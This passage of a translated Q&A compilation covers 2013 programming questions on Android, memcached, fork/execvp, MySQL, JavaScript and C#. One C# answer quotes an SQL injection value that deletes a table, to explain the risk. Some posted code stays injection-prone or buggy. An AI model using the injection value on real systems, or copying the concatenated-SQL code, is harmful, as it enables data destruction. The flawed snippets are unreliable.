   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.util.concurrent.FutureTask.run(FutureTask.java:239)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:230)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1080)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:573)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.lang.Thread.run(Thread.java:856)
   04-25 16:27:06.911: E/AndroidRuntime(4697): Caused by: java.lang.NullPointerException
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at com.example.ayasms.MainActivity$ReadJSON.doInBackground(MainActivity.java:189)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at com.example.ayasms.MainActivity$ReadJSON.doInBackground(MainActivity.java:1)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at android.os.AsyncTask$2.call(AsyncTask.java:287)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  at java.util.concurrent.FutureTask.run(FutureTask.java:234)
   04-25 16:27:06.911: E/AndroidRuntime(4697):  ... 4 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:36:35.663

我假设您在 AsyncJob 中的 try catch 错误处理是问题所在。

例如，如果该行`httpclient.execute(httppost);`抛出异常，您捕获它并将其打印到 Stderr（在 LogCat 中部分可见），然后您继续！

当然，如果没有执行 httpclient.execute(..)，您将没有响应，因此您会收到 NullPointerException。

结论：将 AsyncJob 中的所有内容打包在一个 try catch 环境中。此外，您应该调查哪个类首先失败并找出原因。

```
try {
    response = httpclient.execute(httppost);
    HttpEntity entity = response.getEntity();
    inputStream = entity.getContent();
    reader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"), 8);
    StringBuilder sb = new StringBuilder();

    String line = null;
    while ((line = reader.readLine()) != null) {
    sb.append(line + "\n");
    }
    result = sb.toString();
    jObject = new JSONObject(result);  
    aJsonString1 = jObject.getString("value");
    aJsonString2 = jObject.getString("timestamp");
    return aJsonString1;
} catch (ClientProtocolException e) {
    e.printStackTrace();
} catch (IOException e) {
    e.printStackTrace();
} catch (IllegalStateException e) {
    e.printStackTrace();
} catch (UnsupportedEncodingException e) {
    e.printStackTrace();  
} catch (JSONException e) {
    e.printStackTrace();
}           
return null; // Error case 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:35:24.553

在这条线上：

```
textView.setText(aJsonString1); 
```

`textView`可能仍然为空。

因此，在您的`onCreate`方法中切换以下行：

```
new ReadJSON().execute(there is an address here);

textView = (TextView) findViewById(R.id.textView1); 
```

至

```
textView = (TextView) findViewById(R.id.textView1);
new ReadJSON().execute(there is an address here); 
```

# wpf - XamDateTimeEditor - 用户应仅从下拉日历中选择日期 - WPF/MVVM

> ID：16215945
> 
> 赞同：0
> 
> 时间：2013-04-25T13:22:15.990
> 
> 标签：wpf, xaml, mvvm, infragistics

我可以`XamDateTimeEditor`控制 XAML（下面给出的代码）。目前，用户可以输入日期或从日历下拉列表中选择。但我不希望`XamDateTimeEditor`允许任何用户通过键盘输入任何日期，它只能通过使用鼠标的下拉菜单来完成。

这是 XAML 中的代码 -

```
 <igEditors:XamDateTimeEditor x:Name="xamDateTimeEditorEntryDate"
                                     AutoFillDate="MonthAndYear"
                                     IsAlwaysInEditMode="True"
                                     Mask="mm/dd/yyyy"
                                     Text="{Binding EntryDate,
                                                    Mode=TwoWay,
                                                    UpdateSourceTrigger=PropertyChanged,
                                                    ValidatesOnDataErrors=True}" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-21T08:53:11.223

您可以处理 XamDateTimeEditor 的 PreviewKeyDownEvent 并在事件处理程序中将 e.Handled 属性设置为 true。这样用户将无法使用键盘输入任何内容。

# memcached - 在 CentOS 6 上安装 memcached

> ID：16215957
> 
> 赞同：1
> 
> 时间：2013-04-25T13:23:01.927
> 
> 标签：memcached, centos

我不得不承认在这里在黑暗中摸索。我相当擅长 PHP，但我对管理 LINUX 服务器知之甚少或一无所知。我需要在我的 64 位 CentOS 6 服务器上安装 memcached，并且遇到了两个非常有用的资源

[http://boomshadow.net/tech/installs/how-to-install-memcached/](http://boomshadow.net/tech/installs/how-to-install-memcached/)

我按照那里的步骤进行了操作，memcached 守护程序现在已在我的服务器上启动并运行。我仍然需要为 memcache 安装 PHP 扩展，所以我尝试了这里解释的步骤

[http://boomshadow.net/tech/installs/how-to-install-php-memcache/](http://boomshadow.net/tech/installs/how-to-install-php-memcache/)

这是我得到的输出

```
[root@xxx ~]# pecl install memcache
WARNING: channel "pecl.php.net" has updated its protocols, use "pecl channel-update   
pecl.php.net" to update
downloading memcache-3.0.8.tgz ...
Starting to download memcache-3.0.8.tgz (70,523 bytes)
.................done: 70,523 bytes
15 source files, building
running: phpize
Configuring for:
PHP Api Version:         20090626
Zend Module Api No:      20090626
Zend Extension Api No:   220090626
Enable memcache session handler support? [yes] : yes
building in /var/tmp/pear-build-rootZi8fyR/memcache-3.0.8
running: /var/tmp/memcache/configure --enable-memcache-session=yes
checking for grep that handles long lines and -e... /bin/grep
checking for egrep... /bin/grep -E
checking for a sed that does not truncate output... /bin/sed
checking for cc... no
checking for gcc... no
configure: error: in `/var/tmp/pear-build-rootZi8fyR/memcache-3.0.8':
configure: error: no acceptable C compiler found in $PATH
See `config.log' for more details.
ERROR: `/var/tmp/memcache/configure --enable-memcache-session=yes' failed
[root@xxx 
```

我不能隐瞒这一点——对我来说大部分都是希腊语。我想我已经弄清楚的是 pecl 正在寻找一个 C 编译器来从下载的源代码构建 PHP memcache 驱动程序并且找不到它。即使这是对的，它也对我没有多大帮助。

我需要在这里做什么才能让事情正常工作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-25T13:56:11.970

我猜旧习惯很难改掉——再次回答我自己的问题。

```
# yum groupinstall 'Development Tools' 
```

安装开发工具，包括 gcc 编译器。memcahe.so 扩展使用 zlib 所以你还需要做

```
# yum install zlib-devel 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-01T10:46:52.043

如果您遇到配置：错误：否，sasl.h 不可用。使用 --disable-memcached-sasl 运行配置以禁用此检查 错误：`/var/tmp/memcached/configure --with-libmemcached-dir=no' failed`

```
./configure --enable-memcached-sasl=no
make
make install

pecl install memcached 
```

# php - 如何通过 prestashop 中的前端创建供应商注册

> ID：16215958
> 
> 赞同：0
> 
> 时间：2013-04-25T13:23:03.907
> 
> 标签：php, prestashop

如何通过 prestashop 的前端创建供应商注册？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:31:58.440

这里有一步一步的：http: [//www.inmotionhosting.com/support/edu/prestashop-15/manufacturer-supplier-setup/adding-suppliers](http://www.inmotionhosting.com/support/edu/prestashop-15/manufacturer-supplier-setup/adding-suppliers)。

# visual-studio-2010 - 在 Visual Studio C++ 中编译之前运行一个进程

> ID：16215962
> 
> 赞同：0
> 
> 时间：2013-04-25T13:23:11.157
> 
> 标签：visual-studio-2010, visual-c++

更确切地说，我想在编译之前运行 flex.exe "file.l" 以便能够在之后编译 lex.yy.c。如果有办法做到这一点？我的意思是自动执行它，我只单击运行并完成所有操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:27:31.863

您可以使用[自定义构建步骤](http://msdn.microsoft.com/en-us/library/e85wte0k%28v=vs.80%29.aspx)
检查项目属性->构建事件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:05:34.600

更好的解决方案可能是为 .I 文件添加自定义构建规则，因此 file2.I 也会被编译。此外，每个构建都会运行预构建步骤，但自定义构建规则仅在输入文件更改时运行。

# geolocation - Twitter API 可以搜索来自一个国家的所有最新推文，而不是地理坐标吗？

> ID：16215967
> 
> 赞同：1
> 
> 时间：2013-04-25T13:23:24.690
> 
> 标签：geolocation, twitter, twitter-search

我想搜索来自英国的最新推文，但目前我发现的最接近的是能够从给定坐标搜索半径，例如 `https://api.twitter.com/1.1/search/tweets.json?geocode=51.503355%2C-0.127564%2C50mi`返回来自伦敦中心半径 50 英里的推文。

# mysql - 如何在 MySQL 中加入两个结果集？

> ID：16215974
> 
> 赞同：0
> 
> 时间：2013-04-25T13:23:37.377
> 
> 标签：mysql

我想在 mySQL 中加入两个不同的结果集以并排显示。例如，假设我有一个结果集 #1 如下 -

```
NAME    PHONE
ABC     123
DEF     456
GHI     789 
```

结果集＃2 -

```
MAIL ID        WEBSITE
JKL@JKL.COM    WWW.JKL.COM
MNO@MNO.COM    WWW.MNO.COM
PQR@PQR.COM    WWW.PQR.COM 
```

现在我想要的是这两个结果在一个结果集中并排显示，没有任何关系。

```
NAME    PHONE    MAIL ID        WEBSITE
ABC     123      JKL@JKL.COM    WWW.JKL.COM
DEF     456      MNO@MNO.COM    WWW.MNO.COM
GHI     789      PQR@PQR.COM    WWW.PQR.COM 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:30:29.450

您需要在没有 id 的两个表之间进行连接。好吧，你真的不能这样做。SQL 中的表没有顺序，因此您需要一个键来链接它们。

你可以做点什么。而且，如果你幸运的话，它会起作用的。以下为每个表添加一个行号，然后加入该行：

```
select t1.name, t1.phone, t2.mail, t2.website
from (select t1.*, @r1 as r1, @r1 := @r1 + 1
      from t1 cross join (select @r1 := 0)
     ) r1 join
     (select t2.*, @r2 as r2, @r1 := @r2 + 1
      from t2 cross join (select @r2 := 0)
     ) r2
     on t1.r1 = t2.r2 
```

我必须强调，这*不能*保证有效。您确实需要表之间的正确连接键。但是，它可能会起作用。

# c - fork() 函数永远不会返回 0

> ID：16215976
> 
> 赞同：2
> 
> 时间：2013-04-25T13:24:04.400
> 
> 标签：c, linux

我目前正在尝试在 C 中运行一个 fork 函数，在代码的子部分中，我正在尝试使用 exacvp 执行命令，但在执行之前我正在尝试一个永远不会执行的 printf 函数。我在调试中运行了它，我注意到 pid 从未分配为 0。我确实在一个单独的项目中尝试了一个简单的 fork 示例，它运行顺利。有谁知道为什么子部分永远不会执行？

```
int startProcesses(int background) {
int i = 0;

while(*(lineArray+i) != NULL) {
    int pid;
    int status;
    char *processName;

    pid = fork();

    if (pid == 0) {

        printf("I am child");
        // Child Process
        processName = strtok(lineArray[i], " ");
        execvp(processName, lineArray[i]);
        i++;
        continue;

    } else if (!background) {

        // Parent Process
        waitpid(pid, &status, 0);
        i++;
        if(WEXITSTATUS(status)) {
            printf(CANNOT_RUN_ERROR);
            return 1;
        }
    } else {
        i++;
        continue;
    }
}
return 0; 
```

}

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T13:49:37.570

stdio 文件在程序退出时刷新，但`execvp`直接用另一个图像替换进程，绕过退出时刷新机制，并将`I am child`消息留在内存中永远不会发送到屏幕。添加一个显式的`fflush(stdout)`before `execvp`，或者结束你的字符串，`\n`以便在 TTY 上运行时自动刷新它。

请注意，`execvp`永远不会退出，如果退出，那是因为它未能执行新进程。此时，孩子**唯一**能做的就是报告错误并调用`_exit(127)`（或类似的退出状态）。如果子进程继续，错误配置的命令名称将导致它与父进程并行执行父循环的其余部分。这个过程将继续为其他后代，有效地创建一个分叉炸弹，可以让你的系统停止运行。

# ios - 当子类化 UIToolBar 以具有自定义背景时，工具栏的下半部分是黑色的？

> ID：16215981
> 
> 赞同：0
> 
> 时间：2013-04-25T13:24:13.293
> 
> 标签：ios, uinavigationcontroller, uitoolbar

我是 UIToolBar 的子类，下面是我如何覆盖`drawRect`UIToolBar 的方法：

```
- (void)drawRect:(CGRect)rect
{
    UIImage *backgroundImage = [UIImage imageNamed:@"UIToolBar_Background.png"];
    [backgroundImage drawInRect:CGRectMake(0, 0, self.frame.size.width, self.frame.size.height)];
} 
```

该应用程序使用使用`initWithNavigationBarClass`方法初始化的 UINavigationController 范例。

问题是工具栏的下半部分是黑色的？UIToolBar_Background.png 的高度为 44 像素（或视网膜为 88）。它的下半部分不应该是黑色的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:28:51.073

通过继承 UIToolBar 并覆盖 drawRect，您可以消除一些 UIToolBar 自己的绘图。为什么不使用外观 api 设置背景图像：

```
[[UIToolbar appearance] setBackgroundImage:[UIImage imageNamed:@"UIToolBar_Background.png"]
                        forToolbarPosition:UIToolbarPositionBottom
                                barMetrics:UIBarMetricsDefault]; 
```

或者，您可以使用子类化路线，只需确保在进行自己的绘图之前调用 [super drawrect:rect] ：

```
- (void)drawRect:(CGRect)rect
{
    [super drawRect:rect];
    UIImage *backgroundImage = [UIImage imageNamed:@"UIToolBar_Background.png"];
    [backgroundImage drawInRect:CGRectMake(0, 0, self.frame.size.width, self.frame.size.height)];
} 
```

# php - Zend Framework 2 与 Doctrine 2 自定义验证和对象结构

> ID：16215982
> 
> 赞同：1
> 
> 时间：2013-04-25T13:24:16.823
> 
> 标签：php, oop, doctrine-orm, zend-framework2

什么是支持**ZF2**和**Doctrine2**中的自定义验证的适当类和对象结构？

例如，我有一个简单的用户实体，我希望检查提供的电子邮件是否唯一。此验证需要访问 ，`EntityManager`因此无法从其`getInputFilter`方法中的实体完成。

什么是支持它的适当应用程序结构？

在我当前的工作流程中，用户名在控制器中得到验证，但这似乎有点错误。相关对象和脚本是 VIEW：edituser.phtml 控制器：UserController.php - 获取用户帖子输入并服务 - 创建验证器，并检查是否 ($validator->isValid()) 实体：User.php - 执行其他基本属性验证，但不能执行 isUnique

如果我需要创建一个自定义验证类，哪个对象会实例化并使用它？除了实体之外，我是否绝对需要有一个单独的用户业务模型，才能拥有一个健康的 OOP 结构？

# css - CSS 响应式最大高度在 Safari/笔记本电脑中不起作用？

> ID：16215983
> 
> 赞同：1
> 
> 时间：2013-04-25T13:24:17.860
> 
> 标签：css, responsive-design, media-queries

我有这个 CSS：

```
@media only screen and (max-height: 500px) {
    body{
        display: none;
    }
} 
```

这会在页面达到 500px 时隐藏页面（只是为了测试它），在 Windows PC 上的浏览​​器中工作正常，当我在 Safari 中尝试我的 MacBook Pro 时，它似乎没有检测到它，我怎样才能让它工作适当地？我在谷歌上找不到很多

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:49:06.757

我[对其进行了测试](http://jsfiddle.net/HNf9M/)，它在 Safari(Mac) 上也可以正常工作。

```
div{
    background: #ddd;
    width: 300px;
    height: 300px;
}
@media only screen and (max-height: 500px) {
    div{
        display: none;
    }
} 
```

这是[屏幕截图](http://i.imgur.com/1lM2DTr.png)。虽然 Safari（iPad/iPhone）存在错误。你可能喜欢阅读[这篇](http://developer.apple.com/library/safari/#documentation/appleapplications/reference/safariwebcontent/usingtheviewport/usingtheviewport.html)文章。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:37:08.990

这适用于野生动物园，我只是对其进行了测试以确保。

您的问题中唯一缺少的是该查询相对于您要更改的属性/类的位置。

换句话说，把它放在最后，它就会起作用。

示例：这告诉浏览器在浏览器高度小于 500px 时隐藏正文：

```
body {
    display: block; 
}
@media only screen and (max-height: 500px) {
    body{
        display: none;
    }
} 
```

如果您在最后一个`body`定义中使用另一种方式，则媒体查询将毫无用处。

```
@media only screen and (max-height: 500px) {
    body{
        display: none;
    }
}
body {
    display: block; 
} 
```

# linux - 未找到 Openssl 标头 - 错误

> ID：16215984
> 
> 赞同：1
> 
> 时间：2013-04-25T13:24:19.173
> 
> 标签：linux, openssl, cmake

我需要**为我的 ARM 目标**编译一个 libwebsocket 库，它需要 openssl 才能运行。当我在 cmake 时构建最新的 libwebsocket 时出现以下错误...

但是这里安装了openssl

```
whereis openssl
openssl: /usr/bin/openssl /usr/bin/X11/openssl /usr/share/man/man1/openssl.1ssl.gz 
```

==================================== 错误============== ==

```
-- Looking for 4 include files stdlib.h, ..., float.h - found
-- Found ZLIB: /usr/lib/arm-linux-gnueabihf/libz.so (found version "1.2.7") 
ZLib include dirs: /usr/include
ZLib libraries: /usr/lib/arm-linux-gnueabihf/libz.so
Compiling with SSL support
CMake Error at /usr/local/share/cmake-2.8/Modules/FindPackageHandleStandardArgs.cmake:97 (message):
  Could NOT find OpenSSL, try to set the path to OpenSSL root folder in the
  system variable OPENSSL_ROOT_DIR (missing: OPENSSL_LIBRARIES
  OPENSSL_INCLUDE_DIR)
Call Stack (most recent call first):
  /usr/local/share/cmake-2.8/Modules/FindPackageHandleStandardArgs.cmake:291 (_FPHSA_FAILURE_MESSAGE)
  /usr/local/share/cmake-2.8/Modules/FindOpenSSL.cmake:313 (find_package_handle_standard_args)
  CMakeLists.txt:436 (find_package)

-- Configuring incomplete, errors occurred! 
```

========================================= openssl 在这里======== =================

```
ignite@ignite:~/sbox2/rootfs/rfs-raspbian_2/home/pi/libwebsockets/build$  whereis openssl
openssl: /usr/bin/openssl /usr/bin/X11/openssl /usr/share/man/man1/openssl.1ssl.gz 
```

实际上我有，从这里获取 tarball。它有配置脚本来制作和 安装[http://www.openssl.org/source/openssl-1.0.1e.tar.gz](http://www.openssl.org/source/)

所以有了这个 (openssl-1.0.1e.tar.gz) 将是正确的包 - > openssl-dev 或 openssl-devel --- 这样我就可以解决这个错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-07T04:55:46.120

> 所以有了这个 (openssl-1.0.1e.tar.gz) 将是正确的包 - > openssl-dev 或 openssl-devel --- 这样我就可以解决这个错误？

这些`openssl-dev`软件包用于在主机（可能是 x86 或 x64 系列）上进行开发。您需要一个用于目标（而不是主机）的交叉编译库。所以`openssl-dev`可能不会解决你的问题。

您的目标是通用 ARM 处理器、iOS 还是 Android？如果是前者，您将需要一个适当设置路径的手臂交叉工具链。我不知道有一个关于交叉编译库的好教程（过去我也遇到过）。

有一些用于通用交叉编译的预构建配置。打开`Configure`和`config`，查看一些三元组。（OpenSSL 不使用 Automake 和朋友）。

如果是 iOS 或 Android，OpenSSL wiki 有一些针对平台的交叉编译示例。例如，请参阅[FIPS 库和 Android](http://wiki.openssl.org/index.php/FIPS_Library_and_Android)。该`setenv-android.sh`脚本最重要，因为它设置了路径、sysroot 和工具链。一旦设置了路径和工具链，剩下的就很容易了。

如果您的目标是通用 ARM，那么您可以使用 Android`setenv-android.sh`作为通用构建的起点。完成构建后，指向`OPENSSL_ROOT_DIR`ARM 的安装目录。

# sql-server - 即时加密

> ID：16215990
> 
> 赞同：0
> 
> 时间：2013-04-25T13:24:36.510
> 
> 标签：sql-server, encryption

这是我被问到的一些有趣的事情。它与非加密数据库中的数据加密有关。

故事有如下。我们有一个未加密的数据库，并且在其任何表中也没有加密列。现在，我们想根据谁要求来控制数据的流量。让我解释得更清楚：

我们有一个名称为的表：`table1` 该表有一个名称为：`SName`

我们希望达到以下结果。如果运行以下查询，则连接到 SQL Server Management Studio 的用户：

`select * from table1`

没有结果或如果他/她有结果，这个结果将被打乱。现在从应用程序内部，表应该在正常模式下与应用程序交换数据。

您是否知道是否有可以提供此功能的设置、实现或外部工具？

我认为这是一个非常有趣的案例！

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:39:22.593

使用权限完全阻止那个人阅读表格。

或者使用 VIEW 隐藏表并在其中使用 WHERE 子句静默应用过滤器：这可以引用另一个具有已批准用户列表的表。

这并不是真正的加密（在这种情况下是混淆）问题。

# c# - 会话登录未在按钮单击时注销

> ID：16215991
> 
> 赞同：0
> 
> 时间：2013-04-25T13:24:37.813
> 
> 标签：c#, asp.net, session, session-variables

我目前有一个站点，它从数据库存储用户登录时的变量。一个这样的变量（在成功登录时）是`SiteSession.Current.IsLoggedIn = true`.

当我单击注销按钮时，我的方法告诉它将其设置为`false`，然后继续执行`Session.Clear()`and `Session.Abandon()`。

到目前为止，我必须在进行任何更改之前单击两次注销按钮。
我用`Response.Write(SiteSession.Current.IsLoggedIn);`我的`Logout()`方法测试过。

第一次单击不显示任何内容，然后第二次单击显示`false`。

谁能告诉我哪里出错了？

```
/// <summary>
/// Logs the user out, and destroys the session
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void lnkAccountLogout_Click(object sender, EventArgs e)
{
    SiteSession.Current.IsLoggedIn = false;
    SiteSession.Current.RollId = "-1";

    Session.Clear();
    Session.Abandon();
    Response.Write(SiteSession.Current.IsLoggedIn);
} 
```

〜登录基本上与此相反，同时存储了更多变量。

**编辑：**如果我在第一次单击后重新加载页面，则不会发生任何事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:26:38.370

将更改存储在数据库中可能需要一些时间。尝试让它在另一个线程中运行并让线程等待，直到 IsLoggedIn 为真。

我希望这会有所帮助=)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:35:38.500

我得到全面清理的方法`session`是让我的班级`Session`

```
 private Boolean _isNew = true;
 public Boolean isNew
    {
        get { return _isNew; }
        set { _isNew = value; }

    } 
```

在页面加载时检查是否`isNew`是我

会话.清除（）；

会话.Abandon();

当我完成后，`Session`我只是做了一个新的实例`Session`

//清除会话

SessionVars.Current.Incident = new Incident();

# bash - AWK，字段匹配时删除记录

> ID：16215993
> 
> 赞同：2
> 
> 时间：2013-04-25T13:24:44.663
> 
> 标签：bash, awk

我使用具有 2 个字段的常规文件，第一个是帐户名称（带空格），第二个是一个整数，两个字段都用 . 分隔`\t`，所有记录都用`\n`. 我的问题是我需要删除与第一个字段字符串匹配的记录。我的代码如下：

```
awk -v APENOM="$apeynom" -F "\t" ' $1 != APENOM { print $0; } ' $1 > $TEMP_FILE_2 
```

它适用于大多数记录，但不适用于第一条记录，它永远不会匹配第一条记录中的第一个字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:29:42.913

尝试将脚本更改为：

```
'$1 != APENOM { print $0; next } { print "MISMATCH[", $1, "]" }' 
```

我有一种感觉，你有肮脏的输入。在分隔制表符或其他东西之前可能有一个空格。这将让它打印出`$1`你跳过的内容。

# javascript - 如何正确引用“this”？

> ID：16215994
> 
> 赞同：3
> 
> 时间：2013-04-25T13:24:44.630
> 
> 标签：javascript, jquery

假设我有以下内容：

```
var object = {
    myfunc: function() {
        $.ajax({
           url: url,
           format: format,
           success: function() {

           console.log(this) // This refers to the ajax call and not "object"

                $.ajax({
                  url: url,
                  format: format,
                  success: function() {
                    console.log(this) // this refers to nested ajax call and not "object"
                  }
                });

           }
        });
    }
} 
```

如何让“this”引用“object”而不是ajax调用？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T13:26:37.407

使用[$.proxy()](http://api.jquery.com/jQuery.proxy/)将自定义上下文传递给回调函数

```
var object = {
    myvar : "hello",
    myfunc : function() {
        $.ajax({
            url : url,
            format : format,
            success : $.proxy(function() {

                console.log(this) // This refers to the ajax
                // call and
                // not "object"

                $.ajax({
                    url : url,
                    format : format,
                    success : function() {
                        console.log(this) // this
                        // refers to
                        // nested ajax call
                        // and not "object"
                    }
                });

            }, this)
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T13:27:47.100

`this`当您仍在`this`保存所需值的上下文中时，将 的值复制到另一个变量。

```
var object = {
    myfunc: function() {
        var myObject = this;
        $.ajax({ 
```

然后使用该变量（它将在其中声明的函数的范围内，除非它们用另一个同名变量对其进行掩码）。

```
success: function() {
    console.log(myObject);
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T13:28:28.187

在我看来，这是一种比另一种更容易的方法。只需将引用存储在局部变量中并使用它而不是`this`.

```
var object = {
    var thisReference = this;
    myfunc: function() {
        $.ajax({
           url: url,
           format: format,
           success: function() {

           console.log(thisReference ) 

                $.ajax({
                  url: url,
                  format: format,
                  success: function() {
                    console.log(thisReference ) 
                  }
                });

           }
        });
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T13:36:08.563

使对象成为构造函数。

```
/*
  constructors start with capital letters, by convention.  
  Javascript already has an 'Object' constructor, so we'll change the name.
*/
var MyObject = function(){
  // 'this' now refers to the object.  
  // We'll save a reference to it for use within functions
  var me = this;

  this.myvar: "hello";
  this.myfunc: function(){
    // do whatever you want.  Use 'me' to access your object.
    console.log(me);  // the object!
  }
} 
```

你使用它的方式可能会改变，这取决于你是否想假装是面向对象的。就是这样：

```
var obj = new MyObject();  //make the object
obj.myfunc();            //call your function 
```

# c# - 在 C# 中将文本框值添加到 SQL 数据库

> ID：16215995
> 
> 赞同：0
> 
> 时间：2013-04-25T13:24:47.220
> 
> 标签：c#, sql, sql-server, winforms

我正在尝试将文本框中的值添加到 datagridview 中，我之前曾问过这个问题，但我现在得到一个不同的错误说

> INSERT 语句中的列多于 VALUES 子句中指定的值。VALUES 子句中的值数必须与 INSERT 语句中指定的列数相匹配。

这是导致错误的代码

```
private void SaveBtn_Click(object sender, EventArgs e)
{
    SqlConnection sc = new SqlConnection();
    SqlCommand com = new SqlCommand();
    sc.ConnectionString = ("Data Source=localhost;Initial Catalog=LoginScreen;Integrated Security=True");
    sc.Open();
    com.Connection = sc; 
    com.CommandText = ("INSERT INTO Stock (Prod_ID, Prod_Name, Prod_Cat, Supplier, Cost, Price_1, Price_2, Price_3) VALUES ('"+ProdID.Text+"''"+ProdName.Text+"'+'"+ProdCat.Text+"'+'"+ProdSup.Text+"'+'"+ProdCost.Text+"'+'"+ProdPrice1.Text+"'+'"+ProdPrice2.Text+"'+'"+ProdPrice3.Text+"');");
    com.ExecuteNonQuery();
    sc.Close();
} 
```

[我的数据库](https://i.stack.imgur.com/KTeqN.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T14:03:46.603

错误的直接原因是查询的“值”部分中省略了逗号 (“,”)。你应该这样说

```
VALUES ('"+ProdID.Text+"', '"+ProdName.Text+", '+'"+ProdCat.Text+", '+'"+ProdSup.Text+... 
```

代替

```
VALUES ('"+ProdID.Text+"''"+ProdName.Text+"'+'"+ProdCat.Text+"'+'"+ProdSup.Text+... 
```

您的代码也容易受到所谓的 SQL 注入攻击（假设有人将 '" delete from Stock --' 放入 ProdID.Text：执行将导致 Stock 表清除）

推荐的方式如下所示：

```
using(SqlConnection sc = new SqlConnection()) {
  sc.ConnectionString = "Data Source=localhost;Initial Catalog=LoginScreen;Integrated Security=True";
  sc.Open();

  using (SqlCommand com = sc.CreateCommand()) {
    com.CommandText =
      "insert into Stock(\n" + 
      "  Prod_Id,\n" + 
      "  Prod_Name,\n" +
      "  Prod_Cat,\n" +
      "  Supplier,\n" +
      "  Cost,\n" +
      "  Price_1,\n" +
      "  Price_2,\n" +
      "  Price_3)\n" +
      "values(\n" +
      "  @prm_Prod_Id,\n" +
      "  @prm_Prod_Name,\n" +
      "  @prm_Prod_Cat,\n" +
      "  @prm_Supplier,\n" +
      "  @prm_Cost,\n" +
      "  @prm_Price_1,\n" +
      "  @prm_Price_2,\n" +
      "  @prm_Price_3)";

    //TODO: Change my arbitrary "80" to actual Stock fields' sizes! 
    com.Parameters.Add("@prm_Prod_Id", SqlDbType.VarChar, 80).Value = ProdID.Text;
    com.Parameters.Add("@prm_Prod_Name", SqlDbType.VarChar, 80).Value = ProdName.Text;
    com.Parameters.Add("@prm_Prod_Cat", SqlDbType.VarChar, 80).Value = ProdCat.Text;
    com.Parameters.Add("@prm_Supplier", SqlDbType.VarChar, 80).Value = ProdSub.Text;
    com.Parameters.Add("@prm_Cost", SqlDbType.VarChar, 80).Value = ProdCost.Text;
    com.Parameters.Add("@prm_Price_1", SqlDbType.VarChar, 80).Value = ProdPrice1.Text;
    com.Parameters.Add("@prm_Price_2", SqlDbType.VarChar, 80).Value = ProdPrice2.Text;
    com.Parameters.Add("@prm_Price_3", SqlDbType.VarChar, 80).Value = ProdPrice3.Text;

    com.ExecuteNonQuery();
  }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T13:26:23.590

您在 sql 的值部分中缺少逗号。当你在做这样的事情（一个字符串的大连接）时，你应该知道两件事。首先，一个好的测试方法是写出到控制台、消息框、分机。您通常会立即看到错误。接下来要知道的是，如果您要插入数据库，请不要这样做。使用参数化查询。->[参数化查询如何帮助防止 SQL 注入？](https://stackoverflow.com/questions/5468425/how-do-parameterized-queries-help-against-sql-injection)

```
com.CommandText = ("INSERT INTO Stock (Prod_ID, Prod_Name, Prod_Cat, Supplier, Cost, Price_1, Price_2, Price_3) VALUES ('"+ProdID.Text+"''"+ProdName.Text+"'+'"+ProdCat.Text+"'+'"+ProdSup.Text+"'+'"+ProdCost.Text+"'+'"+ProdPrice1.Text+"'+'"+ProdPrice2.Text+"'+'"+ProdPrice3.Text+"');"); 
```

应该是这样的

```
 com.CommandText = (@"INSERT INTO Stock (Prod_ID, Prod_Name, Prod_Cat, Supplier, Cost, Price_1, Price_2, Price_3) VALUES ('"+ProdID.Text+"','"+ProdName.Text+"','"+ProdCat.Text+"','"+ProdSup.Text+"','"+ProdCost.Text+"','"+ProdPrice1.Text+"','"+ProdPrice2.Text+"','"+ProdPrice3.Text+"');")); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T13:29:07.573

如果未选中任何框，则表单中的复选框值或以逗号分隔的值列表不会产生任何结果。您可能做的最糟糕的事情是将此列表存储在单个记录中。这将导致无法使用的数据。

相反，您不仅希望更改您的代码，还希望更改您的数据库设计，以便您对每个选中的框都有一条记录。请记住考虑未选中任何框的情况。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T13:28:48.363

尝试 ：

```
